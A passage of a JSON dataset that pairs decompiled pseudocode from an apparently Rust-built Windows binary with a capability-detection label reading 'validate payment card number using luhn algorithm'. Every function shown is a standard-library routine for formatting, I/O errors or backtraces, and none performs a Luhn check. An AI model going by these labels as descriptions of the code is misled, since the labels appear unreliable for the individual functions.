        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool sym._std::io::Write::write_fmt::Adapter_T__as_core::fmt::Write_::write_str::h8c7f32d2bcde4c00\n               (ulong *arg1, ulong arg2, ulong arg3)\n\n{\n    int64_t iVar1;\n    \n    // <std::io::Write::write_fmt::Adapter<T> as core::fmt::Write>::write_str::h8c7f32d2bcde4c00\n    iVar1 = dbg.write_all<std::sys::windows::stdio::Stderr>(*arg1, arg2, arg3);\n    if (iVar1 != 0) {\n        if (arg1[1] != 0) {\n            dbg.drop_in_place<std::io::error::Error>(arg1[1]);\n        }\n        arg1[1] = iVar1;\n    }\n    return iVar1 != 0;\n}\n",
        "token_count": 195
    },
    "add353be": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.core::fmt::Write::write_fmt::hadd353be7ab87467(ulong arg1, uint *arg2)\n\n{\n    ulong uStack64;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    \n    // core::fmt::Write::write_fmt::hadd353be7ab87467\n    uStack56 = *arg2;\n    uStack52 = arg2[1];\n    uStack48 = arg2[2];\n    uStack44 = arg2[3];\n    uStack40 = arg2[4];\n    uStack36 = arg2[5];\n    uStack32 = arg2[6];\n    uStack28 = arg2[7];\n    uStack24 = arg2[8];\n    uStack20 = arg2[9];\n    uStack16 = arg2[10];\n    uStack12 = arg2[0xb];\n    uStack64 = arg1;\n    dbg.write(&uStack64, 0x449460, &uStack56);\n    return;\n}\n",
        "token_count": 281
    },
    "c1e02dfe": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.core::ptr::drop_in_place_std::backtrace_rs::symbolize::gimli::mmap::Mmap_::hc1e02dfe27cf1398\n               (ulong *lpBaseAddress)\n\n{\n    // core::ptr::drop_in_place<std::backtrace_rs::symbolize::gimli::mmap::Mmap>::hc1e02dfe27cf1398\n    sub.KERNEL32.dll_UnmapViewOfFile(lpBaseAddress[1]);\n    // WARNING: Could not recover jumptable at 0x0044121c. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(*lpBaseAddress);\n    return;\n}\n",
        "token_count": 159
    },
    "e9095441": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong sym.std::backtrace_rs::backtrace::dbghelp::trace::get_module_base::he9095441fa81ee6f\n                (ulong noname_0, ulong ControlPc)\n\n{\n    ulong uStack8;\n    \n    // std::backtrace_rs::backtrace::dbghelp::trace::get_module_base::he9095441fa81ee6f\n    uStack8 = 0;\n    sub.ntdll.dll_RtlLookupFunctionEntry(ControlPc, &uStack8, 0);\n    return uStack8;\n}\n",
        "token_count": 121
    },
    "c9ae7a0a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t sym._std::io::error::Error_as_core::fmt::Display_::fmt::hc9ae7a0a983fe591\n                   (ulong *arg1, int64_t *arg2, ulong noname_2, ulong arg4, ulong noname_4, ulong noname_5, \n                   ulong noname_6, ulong arg_bp_48h)\n\n{\n    int32_t iVar1;\n    uint8_t **ppuVar2;\n    char cVar3;\n    uint32_t uVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    uint64_t uVar7;\n    uint8_t *puVar8;\n    uint8_t *puVar9;\n    code *UNRECOVERED_JUMPTABLE;\n    int64_t iVar10;\n    uint64_t uVar11;\n    int64_t iVar12;\n    unkbyte7 Var13;\n    uint8_t *puVar14;\n    uint8_t *arg1_00;\n    uint8_t *arg2_00;\n    int16_t iVar15;\n    int64_t iVar21;\n    uint8_t uVar27;\n    char cVar30;\n    char cVar31;\n    char cVar32;\n    uchar auVar28 [16];\n    uchar auVar29 [16];\n    uchar auVar33 [16];\n    uchar auVar34 [16];\n    uint uStack132;\n    ulong uStack128;\n    int64_t iStack120;\n    ulong uStack112;\n    ulong *puStack104;\n    code *pcStack96;\n    uint *puStack88;\n    code *pcStack80;\n    ulong uStack72;\n    ulong uStack64;\n    unkuint3 Var16;\n    unkuint5 Var17;\n    unkuint6 Var18;\n    unkuint7 Var19;\n    uint64_t uVar20;\n    unkbyte9 Var22;\n    unkbyte10 Var23;\n    uchar auVar24 [11];\n    uchar auVar25 [12];\n    uchar auVar26 [13];\n    \n    // <std::io::error::Error as core::fmt::Display>::fmt::hc9ae7a0a983fe591\n    ppuVar2 = *arg1;\n    // switch table (46 cases) at 0x4353c8\n    switch(*((ppuVar2 & 3) * 4 + 0x4353c8) + 0x4353c8) {\n    case 0x434fd1:\n    // WARNING: Could not recover jumptable at 0x00434fea. Too many branches\n    // WARNING: Treating indirect jump as call\n        uVar7 = (**(*(ppuVar2 + 7) + 0x20))(*(ppuVar2 + -1), arg2);\n        return uVar7;\n    case 0x434fed:\n        uStack132 = ppuVar2 >> 0x20;\n        puStack104 = &uStack128;\n        dbg.error_string(puStack104);\n        pcStack96 = sym._alloc::string::String_as_core::fmt::Display_::fmt::ha73f94b165f2af7b;\n        puStack88 = &uStack132;\n        pcStack80 = sym.core::fmt::num::imp::__impl_core::fmt::Display_for_i32_::fmt::hff6e31fbf33ddf61;\n        uStack72 = 0x44a410;\n        uStack64 = 3;\n        uVar4 = sym.core::fmt::Formatter::write_fmt::h489385595d20438a(arg2[4], arg2[5], &uStack72);\n        if (iStack120 != 0) {\n            sym.__rust_dealloc(uStack128, 1);\n        }\n        return uVar4;\n    case 0x435094:\n        UNRECOVERED_JUMPTABLE = *((ppuVar2 >> 0x20) * 4 + 0x4353d8) + 0x4353d8;\n    // WARNING: Could not recover jumptable at 0x004350a6. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (42 cases) at 0x4353d8\n        uVar7 = (*UNRECOVERED_JUMPTABLE)(UNRECOVERED_JUMPTABLE);\n        return uVar7;\n    }\n    arg1_00 = *ppuVar2;\n    arg2_00 = ppuVar2[1];\n    if ((*arg2 != 1) && (arg2[2] != 1)) goto code_r0x004073e4;\n    if (arg2[2] == 1) {\n        puVar8 = NULL;\n        puVar14 = arg1_00;\n        for (iVar10 = arg2[3]; iVar10 != 0; iVar10 = iVar10 + -1) {\n            if (puVar14 == arg1_00 + arg2_00) goto code_r0x00407211;\n            uVar27 = *puVar14;\n            if (uVar27 < '\\0') {\n                if (uVar27 < 0xe0) {\n                    puVar9 = puVar14 + 2;\n                }\n                else if (uVar27 < 0xf0) {\n                    puVar9 = puVar14 + 3;\n                }\n                else {\n                    if ((puVar14[3] & 0x3f | (puVar14[2] & 0x3f) << 6 | (puVar14[1] & 0x3f) << 0xc |\n                        (uVar27 & 7) << 0x12) == 0x110000) goto code_r0x00407211;\n                    puVar9 = puVar14 + 4;\n                }\n            }\n            else {\n                puVar9 = puVar14 + 1;\n            }\n            puVar8 = puVar9 + (puVar8 - puVar14);\n            puVar14 = puVar9;\n        }\n        if ((puVar14 != arg1_00 + arg2_00) &&\n           ((((uVar27 = *puVar14,  -1 < uVar27 || (uVar27 < 0xe0)) || (uVar27 < 0xf0)) ||\n            ((puVar14[3] & 0x3f | (puVar14[2] & 0x3f) << 6 | (puVar14[1] & 0x3f) << 0xc | (uVar27 & 7) << 0x12) !=\n             0x110000)))) {\n            puVar14 = arg1_00;\n            if (puVar8 == NULL) {\n                puVar9 = NULL;\n            }\n            else if (puVar8 < arg2_00) {\n                puVar9 = puVar8;\n                if (arg1_00[puVar8] < -0x40) {\ncode_r0x00407204:\n                    puVar9 = puVar8;\n                    puVar14 = NULL;\n                }\n            }\n            else {\n                puVar9 = arg2_00;\n                if (puVar8 != arg2_00) goto code_r0x00407204;\n            }\n            if (puVar14 != NULL) {\n                arg1_00 = puVar14;\n                arg2_00 = puVar9;\n            }\n        }\n    }\ncode_r0x00407211:\n    if (*arg2 == 0) goto code_r0x004073e4;\n    uVar7 = arg2[1];\n    if (arg2_00 < 0x20) {\n        if (arg2_00 == NULL) {\n            uVar6 = 0;\n        }\n        else {\n            if (arg2_00 == 0x1) {\n                uVar6 = 0;\n                puVar14 = arg1_00;\n            }\n            else {\n                puVar14 = arg2_00 & 0xfffffffffffffffe;\n                uVar6 = (puVar14 + -2 >> 1) + 1;\n                uVar11 = uVar6 & 3;\n                if (puVar14 + -2 < 0x6) {\n                    iVar21 = 0;\n                    iVar12 = 0;\n                    iVar10 = 0;\n                }\n                else {\n                    uVar6 = uVar6 & 0xfffffffffffffffc;\n                    iVar21 = 0;\n                    iVar12 = 0;\n                    iVar10 = 0;\n                    do {\n                        uVar27 = -(*0x444400 < *(arg1_00 + iVar10));\n                        iVar15 = CONCAT11(-(*0x444401 < *(arg1_00 + iVar10) >> 8), uVar27);\n                        Var16 = CONCAT12(-(*0x444402 < '\\0'), iVar15);\n                        uVar4 = CONCAT13(-(*0x444403 < '\\0'), Var16);\n                        cVar3 = -(*0x444404 < '\\0');\n                        Var17 = CONCAT14(cVar3, uVar4);\n                        cVar30 = -(*0x444405 < '\\0');\n                        Var18 = CONCAT15(cVar30, Var17);\n                        cVar31 = -(*0x444406 < '\\0');\n                        Var19 = CONCAT16(cVar31, Var18);\n                        cVar32 = -(*0x444407 < '\\0');\n                        uVar20 = CONCAT17(cVar32, Var19);\n                        Var22 = CONCAT18(-(*0x444408 < '\\0'), uVar20);\n                        Var23 = CONCAT19(-(*0x444409 < '\\0'), Var22);\n                        auVar24 = CONCAT110(-(*0x44440a < '\\0'), Var23);\n                        auVar25 = CONCAT111(-(*0x44440b < '\\0'), auVar24);\n                        auVar26 = CONCAT112(-(*0x44440c < '\\0'), auVar25);\n                        auVar29 = CONCAT142(SUB1614(CONCAT133(SUB1613(CONCAT124(SUB1612(CONCAT115(SUB1611(CONCAT106(\n                                                            SUB1610(CONCAT97(SUB169(CONCAT88(SUB168(CONCAT79(SUB167(\n                                                            CONCAT610(SUB166(CONCAT511(SUB165(CONCAT412(SUB164(CONCAT313\n                                                            (SUB163(CONCAT214(SUB162(CONCAT115(cVar32, CONCAT114(cVar32\n                                                            , CONCAT113(-(*0x44440d < '\\0'), auVar26))) >> 0x70, 0), \n                                                            CONCAT113(cVar31, auVar26)) >> 0x68, 0), \n                                                            CONCAT112(cVar31, auVar25)) >> 0x60, 0), \n                                                            CONCAT111(cVar30, auVar24)) >> 0x58, 0), \n                                                            CONCAT110(cVar30, Var23)) >> 0x50, 0), \n                                                            CONCAT19(cVar3, Var22)) >> 0x48, 0), CONCAT18(cVar3, uVar20)\n                                                            ) >> 0x40, 0), (uVar20 >> 0x18) << 0x38) >> 0x38, 0), \n                                                            (Var19 >> 0x18) << 0x30) >> 0x30, 0), \n                                                            (Var18 >> 0x10) << 0x28) >> 0x28, 0), \n                                                            (Var17 >> 0x10) << 0x20) >> 0x20, 0), (uVar4 >> 8) << 0x18)\n                                                            >> 0x18, 0), (Var16 >> 8) << 0x10) >> 0x10, 0), \n                                            uVar27 | iVar15 << 8);\n                        auVar29 = pshuflw(auVar29, auVar29, 0xd4);\n                        auVar28 = CONCAT412(SUB164(auVar29 >> 0x60, 0), \n                                            CONCAT48(SUB164(auVar29 >> 0x20, 0), SUB168(auVar29, 0))) & *0x444410;\n                        uVar27 = -(*0x444400 < *(arg1_00 + iVar10 + 2));\n                        iVar15 = CONCAT11(-(*0x444401 < *(arg1_00 + iVar10 + 2) >> 8), uVar27);\n                        Var16 = CONCAT12(-(*0x444402 < '\\0'), iVar15);\n                        uVar4 = CONCAT13(-(*0x444403 < '\\0'), Var16);\n                        cVar3 = -(*0x444404 < '\\0');\n                        Var17 = CONCAT14(cVar3, uVar4);\n                        cVar30 = -(*0x444405 < '\\0');\n                        Var18 = CONCAT15(cVar30, Var17);\n                        cVar31 = -(*0x444406 < '\\0');\n                        Var19 = CONCAT16(cVar31, Var18);\n                        cVar32 = -(*0x444407 < '\\0');\n                        uVar20 = CONCAT17(cVar32, Var19);\n                        Var22 = CONCAT18(-(*0x444408 < '\\0'), uVar20);\n                        Var23 = CONCAT19(-(*0x444409 < '\\0'), Var22);\n                        auVar24 = CONCAT110(-(*0x44440a < '\\0'), Var23);\n                        auVar25 = CONCAT111(-(*0x44440b < '\\0'), auVar24);\n                        auVar26 = CONCAT112(-(*0x44440c < '\\0'), auVar25);\n                        auVar29 = CONCAT142(SUB1614(CONCAT133(SUB1613(CONCAT124(SUB1612(CONCAT115(SUB1611(CONCAT106(\n                                                            SUB1610(CONCAT97(SUB169(CONCAT88(SUB168(CONCAT79(SUB167(\n                                                            CONCAT610(SUB166(CONCAT511(SUB165(CONCAT412(SUB164(CONCAT313\n                                                            (SUB163(CONCAT214(SUB162(CONCAT115(cVar32, CONCAT114(cVar32\n                                                            , CONCAT113(-(*0x44440d < '\\0'), auVar26))) >> 0x70, 0), \n                                                            CONCAT113(cVar31, auVar26)) >> 0x68, 0), \n                                                            CONCAT112(cVar31, auVar25)) >> 0x60, 0), \n                                                            CONCAT111(cVar30, auVar24)) >> 0x58, 0), \n                                                            CONCAT110(cVar30, Var23)) >> 0x50, 0), \n                                                            CONCAT19(cVar3, Var22)) >> 0x48, 0), CONCAT18(cVar3, uVar20)\n                                                            ) >> 0x40, 0), (uVar20 >> 0x18) << 0x38) >> 0x38, 0), \n                                                            (Var19 >> 0x18) << 0x30) >> 0x30, 0), \n                                                            (Var18 >> 0x10) << 0x28) >> 0x28, 0), \n                                                            (Var17 >> 0x10) << 0x20) >> 0x20, 0), (uVar4 >> 8) << 0x18)\n                                                            >> 0x18, 0), (Var16 >> 8) << 0x10) >> 0x10, 0), \n                                            uVar27 | iVar15 << 8);\n                        auVar29 = pshuflw(auVar29, auVar29, 0xd4);\n                        auVar29 = CONCAT412(SUB164(auVar29 >> 0x60, 0), \n                                            CONCAT48(SUB164(auVar29 >> 0x20, 0), SUB168(auVar29, 0))) & *0x444410;\n                        uVar27 = -(*0x444400 < *(arg1_00 + iVar10 + 4));\n                        iVar15 = CONCAT11(-(*0x444401 < *(arg1_00 + iVar10 + 4) >> 8), uVar27);\n                        Var16 = CONCAT12(-(*0x444402 < '\\0'), iVar15);\n                        uVar4 = CONCAT13(-(*0x444403 < '\\0'), Var16);\n                        cVar3 = -(*0x444404 < '\\0');\n                        Var17 = CONCAT14(cVar3, uVar4);\n                        cVar30 = -(*0x444405 < '\\0');\n                        Var18 = CONCAT15(cVar30, Var17);\n                        cVar31 = -(*0x444406 < '\\0');\n                        Var19 = CONCAT16(cVar31, Var18);\n                        cVar32 = -(*0x444407 < '\\0');\n                        uVar20 = CONCAT17(cVar32, Var19);\n                        Var22 = CONCAT18(-(*0x444408 < '\\0'), uVar20);\n                        Var23 = CONCAT19(-(*0x444409 < '\\0'), Var22);\n                        auVar24 = CONCAT110(-(*0x44440a < '\\0'), Var23);\n                        auVar25 = CONCAT111(-(*0x44440b < '\\0'), auVar24);\n                        auVar26 = CONCAT112(-(*0x44440c < '\\0'), auVar25);\n                        auVar33 = CONCAT142(SUB1614(CONCAT133(SUB1613(CONCAT124(SUB1612(CONCAT115(SUB1611(CONCAT106(\n                                                            SUB1610(CONCAT97(SUB169(CONCAT88(SUB168(CONCAT79(SUB167(\n                                                            CONCAT610(SUB166(CONCAT511(SUB165(CONCAT412(SUB164(CONCAT313\n                                                            (SUB163(CONCAT214(SUB162(CONCAT115(cVar32, CONCAT114(cVar32\n                                                            , CONCAT113(-(*0x44440d < '\\0'), auVar26))) >> 0x70, 0), \n                                                            CONCAT113(cVar31, auVar26)) >> 0x68, 0), \n                                                            CONCAT112(cVar31, auVar25)) >> 0x60, 0), \n                                                            CONCAT111(cVar30, auVar24)) >> 0x58, 0), \n                                                            CONCAT110(cVar30, Var23)) >> 0x50, 0), \n                                                            CONCAT19(cVar3, Var22)) >> 0x48, 0), CONCAT18(cVar3, uVar20)\n                                                            ) >> 0x40, 0), (uVar20 >> 0x18) << 0x38) >> 0x38, 0), \n                                                            (Var19 >> 0x18) << 0x30) >> 0x30, 0), \n                                                            (Var18 >> 0x10) << 0x28) >> 0x28, 0), \n                                                            (Var17 >> 0x10) << 0x20) >> 0x20, 0), (uVar4 >> 8) << 0x18)\n                                                            >> 0x18, 0), (Var16 >> 8) << 0x10) >> 0x10, 0), \n                                            uVar27 | iVar15 << 8);\n                        auVar33 = pshuflw(auVar33, auVar33, 0xd4);\n                        auVar34 = CONCAT412(SUB164(auVar33 >> 0x60, 0), \n                                            CONCAT48(SUB164(auVar33 >> 0x20, 0), SUB168(auVar33, 0))) & *0x444410;\n                        uVar27 = -(*0x444400 < *(arg1_00 + iVar10 + 6));\n                        iVar15 = CONCAT11(-(*0x444401 < *(arg1_00 + iVar10 + 6) >> 8), uVar27);\n                        Var16 = CONCAT12(-(*0x444402 < '\\0'), iVar15);\n                        uVar4 = CONCAT13(-(*0x444403 < '\\0'), Var16);\n                        cVar3 = -(*0x444404 < '\\0');\n                        Var17 = CONCAT14(cVar3, uVar4);\n                        cVar30 = -(*0x444405 < '\\0');\n                        Var18 = CONCAT15(cVar30, Var17);\n                        cVar31 = -(*0x444406 < '\\0');\n                        Var19 = CONCAT16(cVar31, Var18);\n                        cVar32 = -(*0x444407 < '\\0');\n                        uVar20 = CONCAT17(cVar32, Var19);\n                        Var22 = CONCAT18(-(*0x444408 < '\\0'), uVar20);\n                        Var23 = CONCAT19(-(*0x444409 < '\\0'), Var22);\n                        auVar24 = CONCAT110(-(*0x44440a < '\\0'), Var23);\n                        auVar25 = CONCAT111(-(*0x44440b < '\\0'), auVar24);\n                        auVar26 = CONCAT112(-(*0x44440c < '\\0'), auVar25);\n                        auVar33 = CONCAT142(SUB1614(CONCAT133(SUB1613(CONCAT124(SUB1612(CONCAT115(SUB1611(CONCAT106(\n                                                            SUB1610(CONCAT97(SUB169(CONCAT88(SUB168(CONCAT79(SUB167(\n                                                            CONCAT610(SUB166(CONCAT511(SUB165(CONCAT412(SUB164(CONCAT313\n                                                            (SUB163(CONCAT214(SUB162(CONCAT115(cVar32, CONCAT114(cVar32\n                                                            , CONCAT113(-(*0x44440d < '\\0'), auVar26))) >> 0x70, 0), \n                                                            CONCAT113(cVar31, auVar26)) >> 0x68, 0), \n                                                            CONCAT112(cVar31, auVar25)) >> 0x60, 0), \n                                                            CONCAT111(cVar30, auVar24)) >> 0x58, 0), \n                                                            CONCAT110(cVar30, Var23)) >> 0x50, 0), \n                                                            CONCAT19(cVar3, Var22)) >> 0x48, 0), CONCAT18(cVar3, uVar20)\n                                                            ) >> 0x40, 0), (uVar20 >> 0x18) << 0x38) >> 0x38, 0), \n                                                            (Var19 >> 0x18) << 0x30) >> 0x30, 0), \n                                                            (Var18 >> 0x10) << 0x28) >> 0x28, 0), \n                                                            (Var17 >> 0x10) << 0x20) >> 0x20, 0), (uVar4 >> 8) << 0x18)\n                                                            >> 0x18, 0), (Var16 >> 8) << 0x10) >> 0x10, 0), \n                                            uVar27 | iVar15 << 8);\n                        auVar33 = pshuflw(auVar33, auVar33, 0xd4);\n                        auVar33 = CONCAT412(SUB164(auVar33 >> 0x60, 0), \n                                            CONCAT48(SUB164(auVar33 >> 0x20, 0), SUB168(auVar33, 0))) & *0x444410;\n                        iVar21 = SUB168(auVar33, 0) +\n                                 SUB168(auVar34, 0) + SUB168(auVar29, 0) + SUB168(auVar28, 0) + iVar21;\n                        iVar12 = SUB168(auVar33 >> 0x40, 0) +\n                                 SUB168(auVar34 >> 0x40, 0) + SUB168(auVar29 >> 0x40, 0) +\n                                 SUB168(auVar28 >> 0x40, 0) + iVar12;\n                        iVar10 = iVar10 + 8;\n                        uVar6 = uVar6 - 4;\n                    } while (uVar6 != 0);\n                }\n                if (uVar11 != 0) {\n                    iVar5 = 0;\n                    do {\n                        uVar27 = -(*0x444400 < *(arg1_00 + iVar5 + iVar10));\n                        iVar15 = CONCAT11(-(*0x444401 < *(arg1_00 + iVar5 + iVar10) >> 8), uVar27);\n                        Var16 = CONCAT12(-(*0x444402 < '\\0'), iVar15);\n                        uVar4 = CONCAT13(-(*0x444403 < '\\0'), Var16);\n                        cVar3 = -(*0x444404 < '\\0');\n                        Var17 = CONCAT14(cVar3, uVar4);\n                        cVar30 = -(*0x444405 < '\\0');\n                        Var18 = CONCAT15(cVar30, Var17);\n                        cVar31 = -(*0x444406 < '\\0');\n                        Var19 = CONCAT16(cVar31, Var18);\n                        cVar32 = -(*0x444407 < '\\0');\n                        uVar6 = CONCAT17(cVar32, Var19);\n                        Var22 = CONCAT18(-(*0x444408 < '\\0'), uVar6);\n                        Var23 = CONCAT19(-(*0x444409 < '\\0'), Var22);\n                        auVar24 = CONCAT110(-(*0x44440a < '\\0'), Var23);\n                        auVar25 = CONCAT111(-(*0x44440b < '\\0'), auVar24);\n                        auVar26 = CONCAT112(-(*0x44440c < '\\0'), auVar25);\n                        auVar29 = CONCAT142(SUB1614(CONCAT133(SUB1613(CONCAT124(SUB1612(CONCAT115(SUB1611(CONCAT106(\n                                                            SUB1610(CONCAT97(SUB169(CONCAT88(SUB168(CONCAT79(SUB167(\n                                                            CONCAT610(SUB166(CONCAT511(SUB165(CONCAT412(SUB164(CONCAT313\n                                                            (SUB163(CONCAT214(SUB162(CONCAT115(cVar32, CONCAT114(cVar32\n                                                            , CONCAT113(-(*0x44440d < '\\0'), auVar26))) >> 0x70, 0), \n                                                            CONCAT113(cVar31, auVar26)) >> 0x68, 0), \n                                                            CONCAT112(cVar31, auVar25)) >> 0x60, 0), \n                                                            CONCAT111(cVar30, auVar24)) >> 0x58, 0), \n                                                            CONCAT110(cVar30, Var23)) >> 0x50, 0), \n                                                            CONCAT19(cVar3, Var22)) >> 0x48, 0), CONCAT18(cVar3, uVar6))\n                                                            >> 0x40, 0), (uVar6 >> 0x18) << 0x38) >> 0x38, 0), \n                                                            (Var19 >> 0x18) << 0x30) >> 0x30, 0), \n                                                            (Var18 >> 0x10) << 0x28) >> 0x28, 0), \n                                                            (Var17 >> 0x10) << 0x20) >> 0x20, 0), (uVar4 >> 8) << 0x18)\n                                                            >> 0x18, 0), (Var16 >> 8) << 0x10) >> 0x10, 0), \n                                            uVar27 | iVar15 << 8);\n                        auVar29 = pshuflw(auVar29, auVar29, 0xd4);\n                        auVar29 = CONCAT412(SUB164(auVar29 >> 0x60, 0), \n                                            CONCAT48(SUB164(auVar29 >> 0x20, 0), SUB168(auVar29, 0))) & *0x444410;\n                        iVar21 = iVar21 + SUB168(auVar29, 0);\n                        iVar12 = iVar12 + SUB168(auVar29 >> 0x40, 0);\n                        iVar5 = iVar5 + 2;\n                    } while (uVar11 * 2 != iVar5);\n                }\n                uVar6 = iVar12 + iVar21;\n                if (arg2_00 == puVar14) goto code_r0x004073c7;\n                puVar14 = puVar14 + arg1_00;\n            }\n            do {\n                uVar27 = *puVar14;\n                puVar14 = puVar14 + 1;\n                uVar6 = uVar6 + (-0x41 < uVar27);\n            } while (puVar14 != arg1_00 + arg2_00);\n        }\n    }\n    else {\n        uStack112 = 0x407244;\n        uVar6 = dbg.do_count_chars(arg1_00, arg2_00);\n    }\ncode_r0x004073c7:\n    uVar11 = uVar7 - uVar6;\n    if (uVar6 <= uVar7 && uVar11 != 0) {\n        cVar3 = *(arg2 + 7);\n        if (cVar3 == '\\x03') {\n            cVar3 = '\\0';\n        }\n        if (cVar3 == '\\0') {\n            uVar7 = 0;\n        }\n        else if (cVar3 == '\\x01') {\n            uVar7 = uVar11;\n            uVar11 = 0;\n        }\n        else {\n            uVar7 = uVar11 >> 1;\n            uVar11 = uVar11 + 1 >> 1;\n        }\n        iVar10 = arg2[4];\n        iVar21 = arg2[5];\n        iVar1 = *(arg2 + 0x34);\n        iVar12 = uVar7 + 1;\n        do {\n            iVar12 = iVar12 + -1;\n            Var13 = iVar12 >> 8;\n            if (iVar12 == 0) {\n                uVar7 = CONCAT71(Var13, 1);\n                if (iVar1 == 0x110000) goto code_r0x004074a6;\n                uStack112 = 0x40746e;\n                cVar3 = (**(iVar21 + 0x18))(iVar10, arg1_00, arg2_00);\n                if (cVar3 != '\\0') goto code_r0x004074a6;\n                uVar7 = 0xffffffffffffffff;\n                goto code_r0x00407480;\n            }\n            uStack112 = 0x40744e;\n            cVar3 = (**(iVar21 + 0x20))(iVar10, iVar1);\n        } while (cVar3 == '\\0');\n        uVar7 = CONCAT71(Var13, 1);\ncode_r0x004074a6:\n        return uVar7 & 0xffffffff;\n    }\ncode_r0x004073e4:\n    // WARNING: Could not recover jumptable at 0x00407406. Too many branches\n    // WARNING: Treating indirect jump as call\n    uVar7 = (**(arg2[5] + 0x18))(arg2[4], arg1_00, arg2_00);\n    return uVar7;\n    while( true ) {\n        uStack112 = 0x407492;\n        cVar3 = (**(iVar21 + 0x20))(iVar10, iVar1);\n        uVar6 = uVar7 + 1;\n        uVar7 = uVar6;\n        if (cVar3 != '\\0') break;\ncode_r0x00407480:\n        uVar6 = uVar11;\n        if (uVar7 - uVar11 == -1) break;\n    }\n    uVar7 = uVar6 & 0xffffffffffffff00 | uVar6 < uVar11;\n    goto code_r0x004074a6;\n}\n",
        "token_count": 6986
    },
    "28091210": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.core::ops::function::FnOnce::call_once_u7b__u7b_vtableshim_u7d__u7d_::h28091210f509deb5(int64_t **arg1)\n\n{\n    uchar (*pauVar1) [16];\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    int64_t iVar5;\n    \n    // core::ops::function::FnOnce::call_once$u7b$$u7b$vtableshim$u7d$$u7d$::h28091210f509deb5\n    pauVar1 = **arg1;\n    **arg1 = 0;\n    if (pauVar1 == NULL) {\n        dbg.panic(0x44bcbb, 0x2b, 0x44a720);\n        do {\n            invalidInstructionException();\n        } while( true );\n    }\n    iVar5 = sym.__rust_alloc(0x400, 1);\n    if (iVar5 != 0) {\n        *pauVar1 = ZEXT816(0);\n        *pauVar1[1] = 0;\n        *(pauVar1[1] + 8) = iVar5;\n        uVar4 = *0x44453c;\n        uVar3 = *0x444538;\n        uVar2 = *0x444534;\n        *pauVar1[2] = *0x444530;\n        *(pauVar1[2] + 4) = uVar2;\n        *(pauVar1[2] + 8) = uVar3;\n        *(pauVar1[2] + 0xc) = uVar4;\n        *pauVar1[3] = 0;\n        *(pauVar1[3] + 4) = 0;\n        *(pauVar1[3] + 8) = 0;\n        return;\n    }\n    dbg.handle_alloc_error(0x400);\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 450
    },
    "1c78e37a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.std::sync::once::Once::call_once_force::__u7b__u7b_closure_u7d__u7d_::h1c78e37a3683aa22(int64_t **arg1)\n\n{\n    uchar (*pauVar1) [16];\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    int64_t iVar5;\n    \n    // std::sync::once::Once::call_once_force::_$u7b$$u7b$closure$u7d$$u7d$::h1c78e37a3683aa22\n    pauVar1 = **arg1;\n    **arg1 = 0;\n    if (pauVar1 == NULL) {\n        dbg.panic(0x44bcbb, 0x2b, 0x44a720);\n        do {\n            invalidInstructionException();\n        } while( true );\n    }\n    iVar5 = sym.__rust_alloc(0x400, 1);\n    if (iVar5 != 0) {\n        *pauVar1 = ZEXT816(0);\n        *pauVar1[1] = 0;\n        *(pauVar1[1] + 8) = iVar5;\n        uVar4 = *0x44454c;\n        uVar3 = *0x444548;\n        uVar2 = *0x444544;\n        *pauVar1[2] = *0x444540;\n        *(pauVar1[2] + 4) = uVar2;\n        *(pauVar1[2] + 8) = uVar3;\n        *(pauVar1[2] + 0xc) = uVar4;\n        *pauVar1[3] = 0;\n        *(pauVar1[3] + 4) = 0;\n        *(pauVar1[3] + 8) = 0;\n        return;\n    }\n    dbg.handle_alloc_error(0x400);\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 453
    },
    "3bc1e969": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t sym._std::io::Write::write_fmt::Adapter_T__as_core::fmt::Write_::write_str::h3bc1e969623c193c\n                   (ulong *arg1, ulong arg2, ulong arg3)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    \n    // <std::io::Write::write_fmt::Adapter<T> as core::fmt::Write>::write_str::h3bc1e969623c193c\n    uVar1 = dbg.write_all(**arg1, arg2, arg3);\n    uVar2 = uVar1;\n    if (uVar1 != 0) {\n        if (arg1[1] != 0) {\n            uVar2 = dbg.drop_in_place<std::io::error::Error>(arg1[1]);\n        }\n        arg1[1] = uVar1;\n    }\n    return uVar2 & 0xffffffffffffff00 | uVar1 != 0;\n}\n",
        "token_count": 217
    },
    "114b7a37": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
